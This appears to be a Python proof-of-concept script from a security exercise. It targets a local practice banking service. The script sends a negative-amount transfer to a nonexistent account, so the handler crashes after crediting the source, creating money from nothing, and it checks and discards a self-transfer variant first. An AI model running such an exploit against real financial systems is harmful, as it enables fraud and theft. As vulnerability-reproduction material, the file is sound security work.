#!/usr/bin/env python3
"""PoC (in-code step, F-7): negative-amount mint via crash on unknown dst.

EDUCATIONAL - run against the local practice target only.
Trigger : POST /transfer with NEGATIVE amount and a destination account that
          does not exist.
Effect  : `BALANCES[src] -= amount` with amount=-X CREDITS the source; the
          crash on the unknown destination aborts before any debit lands.
          The credit persists -> money minted out of nothing, repeatable.
Killed hypothesis (honest note): self-transfer mint (from==to, amount<0)
  is a NO-OP - the credit and debit cancel. The mint needs the crash.
Ladder  : theoretical -> in-code (this file). Exit 0 = reproduced.
"""
import http.client
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8765"


def post(src: str, dst: str, amount: int) -> dict | None:
    data = urllib.parse.urlencode({"from": src, "to": dst, "amount": amount}).encode()
    req = urllib.request.Request(BASE + "/transfer", data=data, method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            return json.loads(r.read().decode())
    except (urllib.error.URLError, http.client.HTTPException, ConnectionError, OSError):
        return None


def balances() -> dict:
    return post("vault", "vault", 0)["balances"]


def main() -> int:
    # 0. confirm the naive hypothesis is dead (self-transfer negative = no-op)
    b0 = balances()
    post("alice", "alice", -1000000)
    b1 = balances()
    no_op = b1["alice"] == b0["alice"]
    print(f"[killed ] self-transfer mint (amount<0): alice {b0['alice']} -> {b1['alice']} "
          f"(no-op: {no_op}) - hypothesis discarded")

    # 1. the real mint: negative amount + unknown destination
    before = balances()
    resp = post("alice", "mint_sink_absent", -100)
    after = balances()
    print(f"[attack ] POST from=alice to=mint_sink_absent amount=-100 -> "
          f"{'handler crashed (no response)' if resp is None else resp}")
    print(f"[read   ] alice: {before['alice']} -> {after['alice']}")

    ok = no_op and after["alice"] == before["alice"] + 100
    if not ok:
        print("FAIL: mint not reproduced")
        return 1
    print("REPRODUCED: +100 units created from nothing - the source was credited "
          "and the crashed request debited nothing")
    return 0


if __name__ == "__main__":
    sys.exit(main())
